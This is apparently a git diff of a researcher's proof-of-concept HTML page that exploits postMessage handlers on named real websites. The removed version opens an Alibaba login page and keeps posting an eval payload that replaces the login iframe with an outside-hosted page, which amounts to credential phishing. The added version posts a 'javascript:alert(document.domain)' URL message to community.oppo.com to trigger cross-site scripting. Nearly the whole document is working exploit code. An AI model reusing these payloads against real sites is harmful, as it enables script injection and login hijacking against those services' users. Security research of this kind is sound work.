@@ -7,20 +7,17 @@
   <body>
     <h1>Hi this is a normal page !</h1>
     <script>
-      
-      let win = window.open("https://fis.alibaba.com/madrid/portal/yintuan/login.htm"+location.search);
-      let msg = 'eval(`window.opener.postMessage("injection-done","*"); var interv = setInterval(() => { var iframe = document.getElementById("alibaba-login-box");if (iframe) {clearInterval(interv); iframe.src="https://localhost-mouhannadlrx.github.io/my-POCs/iframe.html"+location.search ; }}, 500);`)'
+      window.onload = function () {
 
-      let interval=setInterval(function () {
-        win.postMessage(msg, "*");
-      }, 2000);
+        let win = window.open("https://community.oppo.com/");
+        let msg =  {action:"location",type:"self",url:"javascript:alert(document.domain)"}
 
-      window.addEventListener("message", function (msg) {
-        if ((msg.origin = "https://fis.alibaba.com/")) {
-          if(msg.data=="injection-done")
-          clearInterval(interval)
-        }
-      });
+   
+
+        setInterval(function () {
+          win.postMessage(msg, "*");
+        }, 2000);
+      };
     </script>
   </body>
 </html>
